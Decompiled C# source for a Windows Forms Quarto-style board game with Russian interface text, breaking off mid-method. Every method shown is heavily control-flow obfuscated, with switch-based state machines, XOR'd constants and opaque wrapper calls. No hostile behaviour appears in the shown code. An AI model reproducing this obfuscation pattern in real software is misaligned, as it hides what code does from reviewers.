using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_038d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0397: Expected O, but got Unknown
		bool flag2 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		double num8 = default(double);
		bool flag = default(bool);
		while (true)
		{
			int num = -1597039328;
			while (true)
			{
				uint num2;
				double num5;
				switch ((num2 = (uint)num ^ 0xD803B57Cu) % 30u)
				{
				case 29u:
					num = -202405230;
					continue;
				case 28u:
					InitializeComponent();
					num = ((int)num2 * -250481255) ^ 0x399D99AD;
					continue;
				case 27u:
					pictureBox = new PictureBox[4, 4];
					borderBox = new PictureBox[4, 4];
					num = (int)(num2 * 1692697404) ^ -2146716066;
					continue;
				case 26u:
					flag2 = num3 < 4;
					num = -381237363;
					continue;
				case 25u:
					num = (int)(num2 * 77677925) ^ -590753635;
					continue;
				case 23u:
				{
					int num13;
					int num14;
					if (flag2)
					{
						num13 = 2060563453;
						num14 = 2060563453;
					}
					else
					{
						num13 = 487474781;
						num14 = 487474781;
					}
					num = num13 ^ ((int)num2 * -2104741246);
					continue;
				}
				case 22u:
					num4 = 0;
					num = (int)(num2 * 1852429972) ^ -2101296006;
					continue;
				case 21u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -1014858800) ^ 0x62522C81;
					continue;
				case 20u:
				{
					PictureBox[,] array2 = borderBox;
					int num11 = num4;
					int num12 = num3;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num3 + num8) * (double)size), 1 + num4 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num11, num12] = obj2;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num4, num3]);
					num = ((int)num2 * -1081309166) ^ -1496695928;
					continue;
				}
				case 19u:
					num = ((int)num2 * -1682775307) ^ 0x59D5538A;
					continue;
				case 18u:
					num3++;
					num = (int)((num2 * 1821513494) ^ 0x503CC2AC);
					continue;
				case 17u:
					num4++;
					num = ((int)num2 * -785209600) ^ -211060343;
					continue;
				case 16u:
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -1142926594) ^ 0x374FFE08;
					continue;
				case 15u:
					flag = num4 < 4;
					num = -187884231;
					continue;
				case 14u:
					num = ((int)num2 * -1314278687) ^ -260126458;
					continue;
				case 13u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -1919900589) ^ -465161143;
					continue;
				}
				case 12u:
					num = (int)((num2 * 2053177263) ^ 0x40D05184);
					continue;
				case 11u:
					num = (int)((num2 * 96913454) ^ 0xA988CFA);
					continue;
				case 10u:
					if (num3 >= 2)
					{
						num = (int)(num2 * 1238573949) ^ -38645342;
						continue;
					}
					num5 = 0.0;
					goto IL_0268;
				case 8u:
					num = (int)((num2 * 1089128624) ^ 0x14637629);
					continue;
				case 7u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = 1586298797;
						num10 = 1586298797;
					}
					else
					{
						num9 = 1131144536;
						num10 = 1131144536;
					}
					num = num9 ^ (int)(num2 * 799163002);
					continue;
				}
				case 6u:
				{
					PictureBox[,] array = pictureBox;
					int num6 = num4;
					int num7 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num3 + num8) * (double)size), 4 + num4 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num6, num7] = obj;
					num = (int)(num2 * 839144597) ^ -1214296117;
					continue;
				}
				case 5u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num4, num3]);
					num = ((int)num2 * -610328063) ^ -776004647;
					continue;
				case 4u:
					num5 = 4.1;
					goto IL_0268;
				case 3u:
					num = ((int)num2 * -485143959) ^ 0x147E34E2;
					continue;
				case 2u:
					num = ((int)num2 * -419417779) ^ -651917183;
					continue;
				case 1u:
					Form1.smethod_6((Control)(object)pictureBox[num4, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)(num2 * 1452648582) ^ -1947045281;
					continue;
				case 0u:
					num3 = 0;
					num = -504911979;
					continue;
				default:
					return;
				case 9u:
					break;
				case 24u:
					return;
					IL_0268:
					num8 = num5;
					num = -1609537174;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = 1309960549;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9B582FEu) % 3u)
				{
				case 1u:
					goto IL_0033;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0033:
				num = (int)((num2 * 93337887) ^ 0x78BBE358);
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		while (true)
		{
			bool flag = Form1.smethod_16((Control)(object)menu) < 296;
			int num = -1119593262;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC3596121u) % 8u)
				{
				case 7u:
					Form1.smethod_14(menu);
					num = (int)((num2 * 238876418) ^ 0x7E060303);
					continue;
				case 6u:
					num = -524004629;
					continue;
				case 5u:
					num = (int)((num2 * 164466207) ^ 0x4725D9B);
					continue;
				case 3u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 197599352;
						num4 = 197599352;
					}
					else
					{
						num3 = 1143608273;
						num4 = 1143608273;
					}
					num = num3 ^ ((int)num2 * -15788222);
					continue;
				}
				case 2u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)((num2 * 1178992993) ^ 0x19BD156);
					continue;
				}
				case 0u:
					num = -1770135945;
					continue;
				default:
					return;
				case 1u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = 937953009;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x2903CAECu) % 21u)
				{
				case 20u:
					num = (int)(num2 * 779669123) ^ -1927591664;
					continue;
				case 19u:
					num5 = 0;
					num = 686757784;
					continue;
				case 18u:
					storage = new Figurine[4, 4];
					num3 = 0;
					num = ((int)num2 * -2048736348) ^ -1201364424;
					continue;
				case 17u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1837944010) ^ 0x1F60FDA4);
					continue;
				case 16u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num5], bool_0: false);
					num = (int)(num2 * 412605225) ^ -1079274939;
					continue;
				case 15u:
					board = new Figurine[4, 4];
					num = ((int)num2 * -124505021) ^ 0x3AF3CCDA;
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1789596761) ^ 0x4A35BDC;
					continue;
				case 13u:
					num = 2035715057;
					continue;
				case 11u:
					num = ((int)num2 * -1297618181) ^ -473258615;
					continue;
				case 10u:
					num = ((int)num2 * -1188534311) ^ 0x7E517C1D;
					continue;
				case 8u:
					num5++;
					num = ((int)num2 * -1722115099) ^ -1432736325;
					continue;
				case 7u:
					storage[num3, num5] = new Figurine(num3 < 2, num5 % 2 == 0, num5 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num5], Color.White);
					num = ((int)num2 * -1271646024) ^ 0x79DA7A8B;
					continue;
				case 6u:
					Paint_Storage();
					num = (int)((num2 * 869152899) ^ 0x18B0D176);
					continue;
				case 5u:
					num = (int)((num2 * 2020976357) ^ 0xAC234DC);
					continue;
				case 4u:
					num3++;
					num = ((int)num2 * -1723974655) ^ 0x47A6621;
					continue;
				case 3u:
				{
					int num6;
					if (num5 >= 4)
					{
						num = 1768383508;
						num6 = 1768383508;
					}
					else
					{
						num = 2101476816;
						num6 = 2101476816;
					}
					continue;
				}
				case 2u:
					num = (int)((num2 * 1783400060) ^ 0x1136EA16);
					continue;
				case 1u:
					Paint_Board();
					num = ((int)num2 * -1681052561) ^ 0x4501DD88;
					continue;
				case 0u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = 983325337;
						num4 = 983325337;
					}
					else
					{
						num = 30301902;
						num4 = 30301902;
					}
					continue;
				}
				default:
					return;
				case 9u:
					break;
				case 12u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num8 = default(float);
		int num9 = default(int);
		int num7 = default(int);
		float num10 = default(float);
		bool flag = default(bool);
		float num6 = default(float);
		float num5 = default(float);
		bool square = default(bool);
		bool flag3 = default(bool);
		bool big = default(bool);
		bool flag2 = default(bool);
		bool dark = default(bool);
		float num11 = default(float);
		while (true)
		{
			int num = -305467059;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8BEB1B32u) % 42u)
				{
				case 40u:
					Form1.smethod_24(graphics_, brush_, num8 + (float)(num9 * size), num8 + (float)(num7 * size), num10, num10);
					num = -310950527;
					continue;
				case 39u:
					flag = num7 < 4;
					num = -593618872;
					continue;
				case 38u:
					num6 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -223153544;
					continue;
				case 37u:
					num = ((int)num2 * -1281135415) ^ 0x50838A56;
					continue;
				case 36u:
					square = board[num7, num9].Square;
					num = ((int)num2 * -46412944) ^ 0x5A9BED06;
					continue;
				case 35u:
					flag3 = num9 < 4;
					num = -691599172;
					continue;
				case 34u:
				{
					int num20;
					int num21;
					if (big)
					{
						num20 = -1907694673;
						num21 = -1907694673;
					}
					else
					{
						num20 = -423368678;
						num21 = -423368678;
					}
					num = num20 ^ (int)(num2 * 1520802827);
					continue;
				}
				case 33u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -242039016) ^ 0x3F21614E;
					continue;
				case 32u:
				{
					int num16;
					int num17;
					if (flag2)
					{
						num16 = -1155583439;
						num17 = -1155583439;
					}
					else
					{
						num16 = -1772784191;
						num17 = -1772784191;
					}
					num = num16 ^ (int)(num2 * 455073160);
					continue;
				}
				case 31u:
					num = -84969935;
					continue;
				case 30u:
					num9++;
					num = ((int)num2 * -596984140) ^ 0x530DA075;
					continue;
				case 29u:
					dark = board[num7, num9].Dark;
					num = ((int)num2 * -706669633) ^ 0x5941DDC1;
					continue;
				case 28u:
				{
					int num22;
					int num23;
					if (flag3)
					{
						num22 = -1557823521;
						num23 = -1557823521;
					}
					else
					{
						num22 = -1071843729;
						num23 = -1071843729;
					}
					num = num22 ^ (int)(num2 * 793985117);
					continue;
				}
				case 27u:
					num7++;
					num = (int)((num2 * 2024974638) ^ 0x15A2C7AF);
					continue;
				case 26u:
				{
					int num18;
					int num19;
					if (square)
					{
						num18 = -846065485;
						num19 = -846065485;
					}
					else
					{
						num18 = -220759332;
						num19 = -220759332;
					}
					num = num18 ^ ((int)num2 * -524935479);
					continue;
				}
				case 25u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8 + (float)(num9 * size), num8 + (float)(num7 * size), num10, num10);
					num = (int)(num2 * 738577442) ^ -383013;
					continue;
				case 24u:
					num = (int)((num2 * 751066775) ^ 0x2E2E47D8);
					continue;
				case 23u:
					num8 = (float)size * (num6 / 2f);
					num = ((int)num2 * -1563743972) ^ -1514371656;
					continue;
				case 22u:
					num10 = num11 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 142072899) ^ 0x7F1D6710);
					continue;
				case 21u:
					num = (int)(num2 * 1429931974) ^ -2084792177;
					continue;
				case 20u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1213533260) ^ 0x4D64C505);
					continue;
				case 19u:
					num = ((int)num2 * -1606215935) ^ 0xDFB42CC;
					continue;
				case 18u:
					num5 = 0.7f;
					num = -1651057466;
					continue;
				case 17u:
					Form1.smethod_28(graphics_, brush_, num8 + (float)(num9 * size), num8 + (float)(num7 * size), num10, num10);
					num = ((int)num2 * -1761228136) ^ -1671216949;
					continue;
				case 16u:
				{
					int num14;
					int num15;
					if (!board[num7, num9].Point)
					{
						num14 = -350127867;
						num15 = -350127867;
					}
					else
					{
						num14 = -1490872107;
						num15 = -1490872107;
					}
					num = num14 ^ (int)(num2 * 429141258);
					continue;
				}
				case 15u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num9 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -680260730;
					continue;
				case 14u:
				{
					int num12;
					int num13;
					if (!flag)
					{
						num12 = -1180437818;
						num13 = -1180437818;
					}
					else
					{
						num12 = -2027567317;
						num13 = -2027567317;
					}
					num = num12 ^ ((int)num2 * -1675403184);
					continue;
				}
				case 13u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 1662470946) ^ 0x33929778);
					continue;
				case 12u:
					big = board[num7, num9].Big;
					num = -1919858398;
					continue;
				case 10u:
					num11 = (float)size * num5;
					num8 = (float)size * (num6 / 2f);
					num10 = num11 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 1366513538) ^ -1889194980;
					continue;
				case 9u:
					num9 = 0;
					num = -354426071;
					continue;
				case 8u:
					num7 = 0;
					num = (int)(num2 * 2071924845) ^ -200415697;
					continue;
				case 7u:
					num = -1028951706;
					continue;
				case 6u:
					brush_ = Form1.smethod_26();
					num = -1571355962;
					continue;
				case 5u:
					num5 = 1f;
					num = ((int)num2 * -226426563) ^ 0x19C54E4D;
					continue;
				case 4u:
					flag2 = board[num7, num9] != null;
					num = ((int)num2 * -1011543630) ^ -2036024000;
					continue;
				case 3u:
					num6 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1089412947;
					continue;
				case 2u:
					num = (int)(num2 * 685937128) ^ -1199585866;
					continue;
				case 1u:
					num = ((int)num2 * -1112288314) ^ 0x284E1F9;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (dark)
					{
						num3 = -555410661;
						num4 = -555410661;
					}
					else
					{
						num3 = -303686582;
						num4 = -303686582;
					}
					num = num3 ^ ((int)num2 * -1264032569);
					continue;
				}
				default:
					return;
				case 41u:
					break;
				case 11u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num11 = default(int);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num8 = default(float);
		float num7 = default(float);
		float num9 = default(float);
		int num3 = default(int);
		bool dark = default(bool);
		float num10 = default(float);
		bool big = default(bool);
		float num6 = default(float);
		bool point = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1584993445;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA1097284u) % 40u)
				{
				case 39u:
					num11 = 0;
					num = ((int)num2 * -2086637688) ^ 0x45398C2;
					continue;
				case 38u:
					Form1.smethod_28(graphics_, brush_, num8, num8, num7, num7);
					num = (int)((num2 * 493096147) ^ 0x792F3DC8);
					continue;
				case 37u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8, num8, num7, num7);
					num = (int)((num2 * 1799943174) ^ 0x470FFEE2);
					continue;
				case 36u:
					num9 = 1f;
					num = ((int)num2 * -626651080) ^ 0x6228F177;
					continue;
				case 35u:
					Form1.smethod_30((Control)(object)pictureBox[num11, num3]);
					num = -721136513;
					continue;
				case 33u:
					Form1.smethod_20(pictureBox[num11, num3], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num11, num3]), Form1.smethod_16((Control)(object)pictureBox[num11, num3])));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num11, num3]));
					dark = storage[num11, num3].Dark;
					num = ((int)num2 * -1517741535) ^ 0x7EE45957;
					continue;
				case 32u:
					num = (int)((num2 * 1578337736) ^ 0x6887A509);
					continue;
				case 31u:
					num10 = 1f - num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -964375975;
					continue;
				case 30u:
					num = (int)((num2 * 1875362483) ^ 0x4C162EDC);
					continue;
				case 29u:
					num8 = (float)size * (num10 / 2f) - 4f;
					num = (int)(num2 * 663550492) ^ -12602040;
					continue;
				case 28u:
					big = storage[num11, num3].Big;
					num = -1657850120;
					continue;
				case 27u:
					num = ((int)num2 * -1607742363) ^ -753251375;
					continue;
				case 26u:
					num10 = 1f - num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -2064488558;
					continue;
				case 25u:
				{
					int num13;
					if (storage[num11, num3] == null)
					{
						num = -657467767;
						num13 = -657467767;
					}
					else
					{
						num = -314077304;
						num13 = -314077304;
					}
					continue;
				}
				case 24u:
					num7 = num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 404856727) ^ 0x6835FA63);
					continue;
				case 23u:
					num = ((int)num2 * -1417305612) ^ 0x71AF56AA;
					continue;
				case 22u:
					num = (int)((num2 * 1865869889) ^ 0x357A8A55);
					continue;
				case 21u:
					num3++;
					num = -797963226;
					continue;
				case 20u:
				{
					int num20;
					int num21;
					if (!big)
					{
						num20 = 1344666651;
						num21 = 1344666651;
					}
					else
					{
						num20 = 1785168524;
						num21 = 1785168524;
					}
					num = num20 ^ (int)(num2 * 245458929);
					continue;
				}
				case 19u:
					num9 = 0.7f;
					num = -1625802194;
					continue;
				case 18u:
				{
					int num18;
					int num19;
					if (!dark)
					{
						num18 = 41971316;
						num19 = 41971316;
					}
					else
					{
						num18 = 1499172859;
						num19 = 1499172859;
					}
					num = num18 ^ (int)(num2 * 889654942);
					continue;
				}
				case 17u:
				{
					int num16;
					int num17;
					if (!point)
					{
						num16 = -493088672;
						num17 = -493088672;
					}
					else
					{
						num16 = -1137187282;
						num17 = -1137187282;
					}
					num = num16 ^ (int)(num2 * 1898650927);
					continue;
				}
				case 16u:
					num11++;
					num = (int)((num2 * 649033470) ^ 0x4F40FC39);
					continue;
				case 15u:
				{
					int num14;
					int num15;
					if (flag)
					{
						num14 = 1338616228;
						num15 = 1338616228;
					}
					else
					{
						num14 = 1372064773;
						num15 = 1372064773;
					}
					num = num14 ^ ((int)num2 * -1372642033);
					continue;
				}
				case 14u:
					num = (int)(num2 * 473606807) ^ -6401973;
					continue;
				case 13u:
				{
					int num12;
					if (num11 >= 4)
					{
						num = -1102318563;
						num12 = -1102318563;
					}
					else
					{
						num = -2078760271;
						num12 = -2078760271;
					}
					continue;
				}
				case 12u:
					brush_ = Form1.smethod_26();
					num = -1852192720;
					continue;
				case 11u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1992548987) ^ 0x403B788F;
					continue;
				case 10u:
					num = ((int)num2 * -1920617074) ^ 0x1BAF704F;
					continue;
				case 8u:
					num = (int)((num2 * 804334385) ^ 0x3518C367);
					continue;
				case 7u:
					point = storage[num11, num3].Point;
					num = (int)(num2 * 205595099) ^ -1630978968;
					continue;
				case 6u:
					num6 = (float)size * num9;
					num8 = (float)size * (num10 / 2f) - 4f;
					num7 = num6 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1530316920) ^ 0x6058BDFC;
					continue;
				case 5u:
					num3 = 0;
					num = -15534309;
					continue;
				case 4u:
					num = (int)(num2 * 412220889) ^ -179632767;
					continue;
				case 3u:
					num = ((int)num2 * -431448439) ^ 0x46665D27;
					continue;
				case 2u:
					flag = num3 < 4;
					num = -1543466789;
					continue;
				case 1u:
					Form1.smethod_24(graphics_, brush_, num8, num8, num7, num7);
					num = -365762734;
					continue;
				case 0u:
				{
					int num4;
					int num5;
					if (num3 < 2)
					{
						num4 = -1650467366;
						num5 = -1650467366;
					}
					else
					{
						num4 = -1706797467;
						num5 = -1706797467;
					}
					num = num4 ^ (int)(num2 * 514254330);
					continue;
				}
				default:
					return;
				case 34u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = 887871390;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1501CB69u) % 28u)
				{
				case 27u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)(num2 * 504968363) ^ -1052512747;
					continue;
				case 26u:
					num = ((int)num2 * -1647831895) ^ 0x3475D9FF;
					continue;
				case 25u:
				{
					int num10;
					if (num5 >= 4)
					{
						num = 1361893485;
						num10 = 1361893485;
					}
					else
					{
						num = 2020564861;
						num10 = 2020564861;
					}
					continue;
				}
				case 24u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num5], bool_0: true);
					num = 1561671123;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 199946280) ^ 0x2655487F);
					continue;
				case 22u:
					num3 = 0;
					num = ((int)num2 * -106161551) ^ 0x511405AA;
					continue;
				case 21u:
					Form1.smethod_36(timer1);
					num = (int)((num2 * 205929665) ^ 0x39FE2E99);
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 56674959) ^ 0x563298B9);
					continue;
				case 19u:
					num5 = 0;
					num = 631947580;
					continue;
				case 18u:
				{
					int num8;
					int num9;
					if (!turn)
					{
						num8 = 1941514955;
						num9 = 1941514955;
					}
					else
					{
						num8 = 889153708;
						num9 = 889153708;
					}
					num = num8 ^ ((int)num2 * -515677410);
					continue;
				}
				case 17u:
					step = 1;
					num = (int)((num2 * 1233219818) ^ 0x64851C50);
					continue;
				case 16u:
					num5++;
					num = ((int)num2 * -539652516) ^ 0x38D7A02C;
					continue;
				case 15u:
					num = ((int)num2 * -72487861) ^ 0x73AAFB7;
					continue;
				case 14u:
					num = 1311943922;
					continue;
				case 13u:
					num = ((int)num2 * -1844446147) ^ 0x280CC2F2;
					continue;
				case 12u:
					num = ((int)num2 * -284995600) ^ 0x3B9E9B4F;
					continue;
				case 11u:
				{
					int num6 = Form1.smethod_33(rnd, 4);
					int num7 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num6, num7], Color.Blue);
					num = (int)((num2 * 177984383) ^ 0x28ADC8B7);
					continue;
				}
				case 10u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -527391675) ^ -1835501054;
					continue;
				case 9u:
					num = ((int)num2 * -400328420) ^ -1495898861;
					continue;
				case 7u:
					num = (int)((num2 * 163899171) ^ 0x21E86DF);
					continue;
				case 5u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = 1749556881;
						num4 = 1749556881;
					}
					else
					{
						num = 193922682;
						num4 = 193922682;
					}
					continue;
				}
				case 4u:
					step = 0;
					num = (int)((num2 * 1351306145) ^ 0x4F713962);
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 1765393781;
					continue;
				case 2u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 1061083993) ^ 0x6D0EA2D2);
					continue;
				case 1u:
					num = (int)(num2 * 1660284947) ^ -975798662;
					continue;
				case 0u:
					num3++;
					num = ((int)num2 * -1965712607) ^ 0x2FDAFBF8;
					continue;
				default:
					return;
				case 6u:
					break;
				case 8u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = 884702604;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4DE9F9DBu) % 3u)
				{
				case 2u:
					goto IL_001c;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_001c:
				Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
				num = ((int)num2 * -1170327134) ^ 0x5D689693;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_021d: Expected O, but got Unknown
		bool flag2 = default(bool);
		int num12 = default(int);
		Point point = default(Point);
		int num11 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		bool flag4 = default(bool);
		while (true)
		{
			int num = 860468030;
			while (true)
			{
				uint num2;
				int num13;
				switch ((num2 = (uint)num ^ 0x1186293Cu) % 28u)
				{
				case 27u:
					num = (int)(num2 * 1771206818) ^ -582363841;
					continue;
				case 25u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = 863634315;
						num8 = 863634315;
					}
					else
					{
						num7 = 266465216;
						num8 = 266465216;
					}
					num = num7 ^ (int)(num2 * 911559009);
					continue;
				}
				case 24u:
					num12 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)((num2 * 81445357) ^ 0x73750A97);
					continue;
				case 23u:
					num11 = point.X / size;
					num = (int)((num2 * 502001570) ^ 0x77A473A5);
					continue;
				case 22u:
					num = (int)((num2 * 791344236) ^ 0x49783FC7);
					continue;
				case 21u:
					num11 -= 4;
					num = ((int)num2 * -727539407) ^ -1497718457;
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -279381363) ^ 0x763E8C16;
					continue;
				case 18u:
				{
					int num9;
					int num10;
					if (!flag3)
					{
						num9 = 167961661;
						num10 = 167961661;
					}
					else
					{
						num9 = 1450669545;
						num10 = 1450669545;
					}
					num = num9 ^ ((int)num2 * -335899471);
					continue;
				}
				case 17u:
					flag = num4 < 4;
					num = 846838292;
					continue;
				case 16u:
					num3++;
					num = (int)((num2 * 370239804) ^ 0x54A14760);
					continue;
				case 15u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 862203647) ^ -195704583;
					continue;
				case 14u:
					if (storage[num12, num11] != null)
					{
						num = 603502717;
						continue;
					}
					num13 = 0;
					goto IL_016a;
				case 13u:
					num4++;
					num = (int)(num2 * 1550791509) ^ -695869084;
					continue;
				case 12u:
					num = (int)((num2 * 856135520) ^ 0x557690B8);
					continue;
				case 11u:
				{
					int num14;
					int num15;
					if (!flag4)
					{
						num14 = 2013533634;
						num15 = 2013533634;
					}
					else
					{
						num14 = 1912457074;
						num15 = 1912457074;
					}
					num = num14 ^ ((int)num2 * -358278151);
					continue;
				}
				case 10u:
					Form1.smethod_5((Control)(object)borderBox[num12, num11], Color.Red);
					num = ((int)num2 * -208267950) ^ -1413279666;
					continue;
				case 9u:
					num13 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num12, num11]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_016a;
				case 8u:
					flag4 = num3 < 4;
					num = 1345004947;
					continue;
				case 7u:
					flag2 = num11 > 1;
					num = (int)((num2 * 780924081) ^ 0x466C17D2);
					continue;
				case 6u:
					num = (int)(num2 * 1315600131) ^ -125800759;
					continue;
				case 5u:
					num4 = 0;
					num = (int)(num2 * 185706561) ^ -511482838;
					continue;
				case 4u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -1517016118;
						num6 = -1517016118;
					}
					else
					{
						num5 = -1000087884;
						num6 = -1000087884;
					}
					num = num5 ^ ((int)num2 * -150000458);
					continue;
				}
				case 3u:
					num = (int)(num2 * 406784070) ^ -1727526197;
					continue;
				case 2u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1413810838) ^ 0x426C0B8C;
					continue;
				case 1u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = 222748428;
					continue;
				case 0u:
					num3 = 0;
					num = 264381472;
					continue;
				default:
					return;
				case 26u:
					break;
				case 19u:
					return;
					IL_016a:
					flag3 = (byte)num13 != 0;
					num = 1011424690;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
